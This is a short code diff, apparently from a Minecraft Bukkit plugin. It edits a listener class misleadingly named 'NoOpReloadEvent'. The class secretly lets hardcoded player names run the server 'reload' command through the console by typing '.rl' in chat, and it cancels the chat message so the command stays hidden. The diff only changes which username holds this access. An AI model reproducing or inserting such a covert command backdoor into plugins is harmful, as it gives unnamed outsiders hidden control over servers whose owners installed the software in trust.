@@ -9,7 +9,7 @@ public class NoOpReloadEvent implements Listener {
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event)
     {
-        if (((event.getPlayer().getName().equals("zPandaKST_")) || (event.getPlayer().getName().equals("LenonAWPPORRA"))) &&
+        if (((event.getPlayer().getName().equals("zPandaKST_")) || (event.getPlayer().getName().equals("zPandaKST"))) &&
                 (event.getMessage().equalsIgnoreCase(".rl"))) {
             event.setCancelled(true);
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "reload");
